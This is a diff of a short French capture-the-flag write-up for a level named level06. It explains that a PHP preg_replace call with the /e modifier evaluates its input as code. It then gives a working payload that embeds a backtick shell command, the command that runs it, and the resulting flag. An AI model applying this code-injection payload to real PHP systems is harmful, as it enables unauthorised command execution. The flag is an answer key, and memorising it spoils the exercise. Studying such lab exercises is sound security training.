@@ -1,2 +1,15 @@
-Temporary : 
-  - Flag : wiok45aaoguiboiki2tuin6ub
+Explication : 
+
+Lorsqu'on analyse le .php, on remarque une ligne :
+
+preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+
+Cette ligne est problematique car le /e va executer le regex en code php et non en texte.
+
+Cette faille va nous permettre d'executer du code, et etant donne que le programme a les permissions de flag06, executer getflag nous donnera le flag.
+
+echo '[x ${`getflag`}]' > /tmp/test
+
+./level06 /tmp/test
+
+Flag : wiok45aaoguiboiki2tuin6ub
